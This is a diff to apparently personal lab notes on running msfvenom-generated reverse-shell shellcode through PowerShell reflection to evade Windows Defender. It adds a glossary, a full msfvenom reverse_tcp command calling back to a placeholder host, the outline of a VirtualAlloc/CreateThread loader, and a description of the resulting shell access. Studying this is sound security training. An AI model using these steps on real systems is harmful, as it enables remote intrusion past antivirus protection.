@@ -3,8 +3,26 @@
 - Executing shellcode with PowerShell ✅
 
 # TLDR:
-# Exploit:
+- **Shellcode**: Small, exploitative code (often in assembly) used for attacks like buffer overflows to execute commands or gain control over systems.
 
+- **PowerShell**: Windows scripting tool for task automation, frequently abused by attackers for post-exploitation due to its access to system internals and ability to avoid disk-based detection.
+
+- **Windows Defender**: Security software to detect malicious scripts, which attackers bypass using obfuscation or reflective injection to load code into memory.
+
+- **Windows API**: Interfaces allowing interaction with the operating system. Commonly exploited functions include `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject`.
+
+- **PowerShell Reflection**: Technique to dynamically call Windows API functions in PowerShell, enabling stealthy execution of code.
+
+- **Reverse Shell**: A connection where the target system (victim) connects back to the attacker’s machine, providing remote access.
+  
+# Exploit:
+1. **Generate Shellcode:** Using msfvenom we generate shellcode for PowerShell: 
+	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=VM_IP LPORT=1111 -f powershell`
+2. **Prepare Execution Script**: 
+   * Use PowerShell with embedded C# code to dynamically call Windows API functions.
+   * Insert generated shellcode into the script as hex-encoded byte array
+   * Allocate memory with `VirtualAlloc`, copy shellcode, create a new thread to execute the shellcode and wait for completion.
+3. Depoly 
 # Deepened:
 ## Essential Terminologies
 - **Shellcode**: A piece of code usually used by malicious actors during exploits like **buffer overflow** attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.
@@ -165,3 +183,7 @@ $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
 [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
 
+If done properly, the PowerShell terminal in the VM will look like the screenshot below:
+![[62a7685ca6e7ce005d3f3afe-1732698537726.png]]
+Once you execute the final line in the PowerShell terminal and press `Enter`, you will get a reverse shell in your VM, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing `dir`, which will list all the directories:
+![[62a7685ca6e7ce005d3f3afe-1727972837925.png]]
